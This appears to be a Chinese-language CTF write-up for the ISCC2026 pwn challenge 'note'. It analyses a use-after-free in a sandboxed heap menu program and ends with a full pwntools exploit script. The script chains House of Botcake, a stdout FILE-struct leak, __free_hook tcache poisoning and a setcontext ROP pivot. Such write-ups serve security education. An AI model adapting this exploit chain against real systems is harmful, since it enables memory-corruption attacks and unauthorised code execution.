+++
title = "Note"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

PWN+note

解题思路（必须包含文字说明+截图）

1.程序分析

题目给出一个名为 note 的 ELF 64-bit 可执行文件和 libc-2.31.so 动态链接库。题目描述为"Silent Note System"，提供了 add / delete / edit 三个堆块操作功能，但没有 show 功能（无法直接读取堆块内容）。

使用 checksec 检查保护机制：

- Full RELRO：无法覆写 GOT 表

- Stack Canary：栈溢出受阻

- NX enabled：堆/栈不可执行

- PIE enabled：地址随机化

程序首先调用 setup_sandbox() 函数，通过 libseccomp 库设置沙箱规则。反汇编 setup_sandbox 函数可见允许的系统调用有：

- brk(12)、mmap(9)、munmap(11)

- exit(60)、exit_group(231)

- open(2)、openat(257)

- read(0)、write(1)

- rt_sigreturn(15)

execve 被禁止，这意味着无法直接 get shell，需要采用 ORW（Open-Read-Write）方式读取 flag。

逆向分析核心函数：

add_note 函数（0x15DB）：

- 接收 index（0-15）和 size（1-1024）

- notes[idx] = malloc(size)，sizes[idx] = size

- read(0, notes[idx], size) 读取用户数据

- 如果该 index 已有堆块，旧指针直接被覆盖（造成内存泄漏，但非主要漏洞）

delete_note 函数（0x172B）：

- 接收 index（0-15），调用 free(notes[idx])

- 关键漏洞：释放后未将 notes[idx] 和 sizes[idx] 置零

- 导致悬垂指针（Dangling Pointer），后续可对已释放堆块进行读写

edit_note 函数（0x17D8）：

- 接收 index（0-15），使用 sizes[idx] 作为长度

- read(0, notes[idx], sizes[idx]) 将数据写入 notes[idx]

- 关键漏洞：未检查堆块是否已被释放，可直接对已释放堆块写入

- 形成 Use-After-Free (UAF) 漏洞

main 函数：

- 循环调用 menu() 显示菜单，get_int() 读取选择

- 1→add_note、2→delete_note、3→edit_note、4→exit(0)

2.漏洞利用策略

核心漏洞：UAF（释放后可编辑）。由于没有 show 功能，无法直接读取堆块数据获取 libc 地址，必须通过篡改 stdout 的 FILE 结构体来触发输出泄漏。

整体攻击路径：

第一步：利用 House of Botcake 技术 + UAF 局部覆写获取一个重叠于 _IO_2_1_stdout_ 的堆块，修改其 FILE 结构体，使后续 puts() 调用泄漏 libc 基址。

第二步：利用两次 tcache poisoning 将 ORW ROP 链和 setcontext 寄存器帧写入 __free_hook 附近内存区域。

第三步：释放一个精心构造的触发堆块，通过 __free_hook → magic_gadget → setcontext+61 完成栈迁移和寄存器设置，执行 ORW ROP 链条读取 flag。

3.第一阶段：泄漏 libc 基址

（1）预处理：由于程序使用 seccomp 沙箱，seccomp 自身会分配并释放一些堆块占用 tcache。先对各常用 size 大量分配释放，耗尽 seccomp 残留的 tcache 条目，避免干扰后续堆布局。

（2）堆布局准备：

- 分配 chunk A：idx=0，size=0x88（实际 malloc 大小 0x90）

- 分配 chunk B：idx=1，size=0x98（实际 malloc 大小 0xa0）

- 分配 guard chunk：idx=3，size=0x20（防止与 top chunk 合并）

- 分配 chunk X：idx=2，size=0x98

（3）填充 tcache：

- 分配并释放 7 个 size=0x98 的堆块，填满 tcache[0xa0]

- 分配并释放 7 个 size=0x88 的堆块，填满 tcache[0x90]

- 此时这两种 size 的释放将进入 unsorted bin 而非 tcache

（4）构建 House of Botcake 双重链接：

- free(idx=0) → chunk A 进入 unsorted bin，fd/bk = main_arena+96

- free(idx=1) → chunk B 与 chunk A 相邻，glibc 触发向后合并

- A+B 合并为一个 size≈0x130 的大堆块，留在 unsorted bin 中

- alloc 7 个 size=0x98 的堆块（耗尽 tcache[0xa0]）

- free(idx=2) → chunk X 进入 tcache[0xa0]（此时 tcache 已空，X 为 head）

- free(idx=1) → chunk B（虽已合并入 unsorted bin，但 notes[1] 悬垂指针依然有效）再次被释放，进入 tcache[0xa0]，形成重叠状态

此时 chunk B 同时存在于：

- unsorted bin 的大合并块内部

- tcache[0xa0] 的链表中

两者共享同一块用户数据区域。

（5）制造 libc 地址写入：

- alloc 7 个 size=0x88 的堆块，耗尽 tcache[0x90]

- alloc(idx=0, size=0x88) → 从 unsorted bin 大块中切割 0x90 字节

- 切割后的 remainder 恰好在 chunk B 的位置

- glibc 将 main_arena+96 写入 remainder 的 fd 字段（即 chunk B 的 tcache fd 位置）

此时 chunk B 的 tcache fd = main_arena+96（libc 地址）。

（6）局部覆写实现 stdout 劫持：

- 利用 UAF，edit(idx=1) 局部覆写 chunk B 的 fd 低 2 字节

- main_arena+96 低 2 字节固定为 0xcbe0（不受 ASLR 影响）

- 覆写为 (nibble&lt;&lt;12)|0x6a0，其中 nibble 对应 _IO_2_1_stdout_ 地址的第 3 个 nibble（1/16 概率正确）

- tcache[0xa0] 链表变为：B → fake_chunk_near_stdout

- alloc 两次从 tcache[0xa0] 获取堆块，第二次获取的是位于 _IO_2_1_stdout_ 附近的伪堆块

（7）篡改 stdout 触发泄漏：

- 向伪堆块写入精心构造的数据：

p64(0xfbad1800) + p64(0)*3 + b'\\x00'

- 0xfbad1800：设置 flags 包含 _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING | _IO_MAGIC 等标志位

- 三段 p64(0)：将 _IO_read_ptr、_IO_read_end、_IO_read_base 全部清零

- b'\\x00'：将 _IO_write_base 首字节置 0，使其远小于 _IO_write_ptr

- glibc 在下一次 puts 调用时，认为缓冲区有待刷新的数据，将 _IO_write_base 至 _IO_write_ptr 的内容输出到 stdout

- 此段数据中包含 libc 地址，从而完成信息泄漏

4.第二阶段：构造 ORW 载荷并劫持控制流

与常见做法使用三次 tcache poisoning 逐步写入 free_hook 区域不同，本方案采用更大的堆块尺寸（0xe8），仅需两次 tcache poisoning 即可写入完整载荷。

（1）ORW ROP 链设计（写入 free_hook+0x110 处）：

open("./flag", O_RDONLY) → read(3, buf, 0x100) → write(1, buf, 0x100)

各 gadget 均来自 libc-2.31：

- pop rdi; ret @ 0x23b6a

- pop rsi; ret @ 0x2601f

- pop rdx; pop rbx; ret @ 0x15fae6

- pop rax; ret @ 0x36174

- syscall; ret @ 0x630a9

- ret @ 0x22679（用于栈对齐）

flag 字符串 "./flag\\x00" 放置在 ROP 链尾部。

（2）第一次 tcache poisoning：

- 释放两个 size=0xe8 的堆块，构造 tcache 链表

- UAF 修改链表尾部堆块的 fd，指向 free_hook+0x110

- 连续分配三次，第三次获得 free_hook+0x110 处的伪堆块

- 将完整的 ORW ROP 链和 "./flag\\x00" 写入

（3）第二次 tcache poisoning：

- 释放两个 size=0xe8 的堆块

- UAF 修改 fd 指向 free_hook

- 连续分配三次，第三次获得 free_hook 处的伪堆块

- 写入以下结构：

[0x00] magic_gadget （mov rdx,[rdi+8]; call [rdx+0x20]）

[0x10] rdx_target = free_hook+8

[0x28] setcontext+61 （rdx+0x20 位置，magic_gadget 将调用此处）

[0x50-0x70] 各通用寄存器（r12-r15）填充为 0

[0x80] rbx = 0

[0x88] rbp = 0

[0xa8] rsp = free_hook+0x110 （指向第一步写入的 ROP 链）

[0xb0] rip = ret（栈对齐 gadget）

5.第三阶段：触发漏洞获取 flag

（1）分配一个普通的 size=0x98 堆块作为触发器（idx=14）

（2）编辑触发器，写入：p64(0) + p64(free_hook+8)

- [0x00] 保留为 0

- [0x08] = free_hook+8（将在 magic_gadget 中被加载到 rdx 寄存器）

（3）调用 delete(idx=14) 释放触发器

当 free(trigger_chunk) 执行时：

1\. glibc 调用 __free_hook(trigger_chunk_addr)

2\. __free_hook = magic_gadget，RIP 跳转到 magic_gadget

3\. magic_gadget 执行 mov rdx, [rdi+8]，得到 rdx = free_hook+8

4\. 执行 call [rdx+0x20]，跳转到 setcontext+61

5\. setcontext+61 从 [rdx+0xa0] 恢复 rsp = free_hook+0x110

6\. 从 [rdx+0xa8] 恢复并跳转到 ret gadget

7\. ret 执行后，rsp 指向 ROP 链第一条 gadget（pop rdi; ret）

8\. ORW ROP 链依次执行 open → read → write，将 flag 内容输出到终端

Exp

from pwn import *\
import time\
\
context(arch='amd64', os='linux', log_level='info')\
\
# ====== libc-2.31 offsets ======\
STDOUT_OFF = 0x1ed6a0\
FREE_HOOK_OFF = 0x1eee48\
SETCTX61_OFF = 0x54f5d\
MAGIC_OFF = 0x151bb0\
\
POP_RDI = 0x23b6a\
POP_RSI = 0x2601f\
POP_RDX_RBX = 0x15fae6\
POP_RAX = 0x36174\
SYSCALL_RET = 0x630a9\
RET = 0x22679\
\
TARGET_HOST = '39.96.193.120'\
TARGET_PORT = 10011\
\
def exploit(tube, nibble):\
D = 0.2\
\
def add(idx, sz, data=None):\
if data is None:\
data = b'A' * sz\
tube.sendlineafter(b'Choice', b'1')\
tube.sendlineafter(b'Index', str(idx).encode())\
tube.sendlineafter(b'Size', str(sz).encode())\
tube.sendafter(b'Content', data.ljust(sz, b'\\x00')[:sz])\
time.sleep(D)\
\
def delete(idx):\
tube.sendlineafter(b'Choice', b'2')\
tube.sendlineafter(b'Index', str(idx).encode())\
time.sleep(D)\
\
def edit(idx, data):\
tube.sendlineafter(b'Choice', b'3')\
tube.sendlineafter(b'Index', str(idx).encode())\
tube.sendafter(b'Content', data)\
time.sleep(D)\
\
# ---- Phase 0: Fill seccomp's tcache by allocating many chunks ----\
for sz in [0x08, 0x18, 0x28, 0x48, 0x58, 0x68, 0x78, 0x88, 0x98, 0xb8, 0xd8]:\
for _ in range(50):\
add(15, sz)\
\
# ---- Phase 1: House of Botcake - Leak libc via stdout ----\
# Step 1: Allocate A(0x88 at idx0), B(0x98 at idx1), guard(0x20 at idx3), X(0x98 at idx2)\
add(0, 0x88, b'A' * 0x88)\
add(1, 0x98, b'B' * 0x98)\
add(3, 0x20, b'G' * 0x20)\
add(2, 0x98, b'X' * 0x98)\
\
# Step 2: Fill tcache[0xa0] and tcache[0x90] (7 entries each)\
for i in range(4, 11):\
add(i, 0x98)\
for i in range(4, 11):\
delete(i)\
for i in range(4, 11):\
add(i, 0x88)\
for i in range(4, 11):\
delete(i)\
\
# Step 3: Free A -&gt; unsorted bin, free B -&gt; merge with A (0x130 big chunk)\
delete(0)\
delete(1)\
\
# Step 4: Drain tcache[0xa0] by allocating 7 chunks\
for i in range(4, 11):\
add(i, 0x98)\
\
# Step 5: Free X -&gt; tcache[0xa0], then free B again (UAF) -&gt; tcache[0xa0] double-linked\
# B is inside the merged unsorted bin chunk\
delete(2)\
delete(1) # UAF: B goes to tcache[0xa0], head=B, B.fd=X\
\
# Step 6: Drain tcache[0x90]\
for i in range(4, 11):\
add(i, 0x88)\
\
# Step 7: Split unsorted bin (0x130), allocate 0x88 -&gt; remainder at B's position\
# glibc writes main_arena+96 to remainder's fd (which is B's user data = B's tcache fd)\
add(0, 0x88)\
\
# Step 8: UAF partial overwrite B's fd (now has main_arena+96 in low bytes)\
# Overwrite low 2 bytes -&gt; redirect to _IO_2_1_stdout_ area\
# main_arena+96 low 2B = 0xcbe0 -&gt; target stdout = 0xd6a0\
edit(1, p16((nibble &lt;&lt; 12) | 0x6a0))\
\
# Step 9: Pop from tcache[0xa0]: first pop = B (original), second pop = stdout area\
add(1, 0x98) # pop B\
\
# Step 10: Get chunk at stdout area\
try:\
tube.sendlineafter(b'Choice', b'1')\
tube.sendlineafter(b'Index', b'1')\
tube.sendlineafter(b'Size', b'152')\
# Write fake FILE struct flags to trigger libc leak\
tube.sendafter(b'Content', p64(0xfbad1800) + p64(0) * 3 + b'\\x00')\
time.sleep(0.5)\
leaked = tube.clean(timeout=2)\
if len(leaked) &lt; 16:\
return False\
except:\
return False\
\
# Parse leaked libc address\
libc_base = 0\
for i in range(len(leaked) - 7):\
val = u64(leaked[i:i + 8])\
if (val &gt;&gt; 40) == 0x7f:\
for off in [0x1ec980, 0x1ecbe0, 0x1ed6a0, 0x1ed5c0, 0x1ed4a0]:\
cand = val - off\
if cand &gt; 0 and cand & 0xfff == 0:\
libc_base = cand\
break\
if libc_base:\
break\
if not libc_base:\
return False\
\
log.success(f"libc base: {hex(libc_base)}")\
\
# Compute addresses\
free_hook = libc_base + FREE_HOOK_OFF\
magic = libc_base + MAGIC_OFF\
setctx = libc_base + SETCTX61_OFF\
pop_rdi = libc_base + POP_RDI\
pop_rsi = libc_base + POP_RSI\
pop_rdxrbx= libc_base + POP_RDX_RBX\
pop_rax = libc_base + POP_RAX\
syscall = libc_base + SYSCALL_RET\
ret = libc_base + RET\
\
# ---- Phase 2: Write everything at free_hook area (2 poisonings) ----\
# Strategy: Use chunk size 0xe8 for large payload capacity\
# Poisoning 1: free_hook+0x110 -&gt; ORW ROP chain + "/flag" string\
# Poisoning 2: free_hook -&gt; magic_gadget + setcontext frame\
# Trigger: regular heap chunk edited with [8]=free_hook+8\
\
SZ = 0xe8 # Chunk size for poisonings (large enough for complete frame)\
\
# Clean up\
for i in range(4, 15):\
delete(i)\
time.sleep(0.3)\
\
# ==== Poisoning 1: Write ORW chain at free_hook + 0x110 ====\
add(4, SZ)\
add(5, SZ)\
delete(4)\
delete(5)\
# tcache[SZ_bin]: head-&gt;5, 5.fd=4, 4.fd=NULL\
edit(4, p64(free_hook + 0x110)) # corrupt tail's fd\
add(6, SZ) # pop 5\
add(7, SZ) # pop 4\
add(8, SZ) # pop free_hook+0x110 (our target)\
\
flag_addr = free_hook + 0x110 + 0xc0 # within this chunk: offset 0xc0\
buf_addr = free_hook + 0x300 # safe area past free_hook\
\
rop = b''\
rop += p64(pop_rdi) + p64(flag_addr) # open("./flag", 0)\
rop += p64(pop_rsi) + p64(0)\
rop += p64(pop_rax) + p64(2)\
rop += p64(syscall)\
rop += p64(pop_rdi) + p64(3) # read(3, buf, 0x100)\
rop += p64(pop_rsi) + p64(buf_addr)\
rop += p64(pop_rdxrbx) + p64(0x100) + p64(0)\
rop += p64(pop_rax) + p64(0)\
rop += p64(syscall)\
rop += p64(pop_rdi) + p64(1) # write(1, buf, 0x100)\
rop += p64(pop_rsi) + p64(buf_addr)\
rop += p64(pop_rdxrbx) + p64(0x100) + p64(0)\
rop += p64(pop_rax) + p64(1)\
rop += p64(syscall)\
\
payload1 = rop.ljust(0xc0, b'\\x00') + b'./flag\\x00'\
edit(8, payload1)\
\
# ==== Poisoning 2: Write magic_gadget + setcontext frame at free_hook ====\
add(9, SZ)\
add(10, SZ)\
delete(9)\
delete(10)\
edit(9, p64(free_hook))\
add(11, SZ) # pop 10\
add(12, SZ) # pop 9\
add(13, SZ) # pop free_hook\
\
# Build frame at free_hook\
# rdx = free_hook + 8 (set by trigger chunk's bk)\
frame = bytearray(SZ)\
frame[0x00:0x08] = p64(magic) # free_hook[0] = magic_gadget\
frame[0x10:0x18] = p64(free_hook+8) # rdx = free_hook+8 ([rdi+8] in magic)\
frame[0x28:0x30] = p64(setctx) # [rdx+0x20] = setcontext+61\
# setcontext frame registers (rdx = free_hook + 8)\
frame[0x50:0x58] = p64(0) # r12 [rdx+0x48]\
frame[0x58:0x60] = p64(0) # r13 [rdx+0x50]\
frame[0x60:0x68] = p64(0) # r14 [rdx+0x58]\
frame[0x68:0x70] = p64(0) # r15 [rdx+0x60]\
frame[0x80:0x88] = p64(0) # rbx [rdx+0x78]\
frame[0x88:0x90] = p64(0) # rbp [rdx+0x80]\
frame[0xa8:0xb0] = p64(free_hook + 0x110) # rsp [rdx+0xa0]\
frame[0xb0:0xb8] = p64(ret) # rip [rdx+0xa8]\
\
edit(13, bytes(frame))\
\
# ==== Phase 3: Trigger ====\
# Prepare a regular heap chunk: [8] = free_hook+8 (= rdx for magic_gadget)\
add(14, 0x98)\
edit(14, p64(0) + p64(free_hook + 8))\
\
# free(14) -&gt; __free_hook(chunk) -&gt; magic_gadget:\
# rdx = [chunk+8] = free_hook+8\
# call [rdx+0x20] = [free_hook+0x28] = setcontext+61\
# setcontext+61:\
# rsp = [rdx+0xa0] = [free_hook+0xa8] = free_hook+0x110\
# rip = [rdx+0xa8] = [free_hook+0xb0] = ret (stack alignment)\
# ROP chain at free_hook+0x110: open -&gt; read -&gt; write\
delete(14)\
\
time.sleep(2)\
result = tube.recvall(timeout=5)\
if result:\
log.success(f"Result: {result}")\
return True\
return False\
\
\
if __name__ == '__main__':\
for nib in range(16):\
log.info(f"Attempt nibble = {nib:\#x}")\
try:\
tube = remote(TARGET_HOST, TARGET_PORT)\
if exploit(tube, nib):\
tube.close()\
break\
tube.close()\
except Exception as e:\
log.warning(f"[{nib:\#x}] {e}")\
time.sleep(0.5)
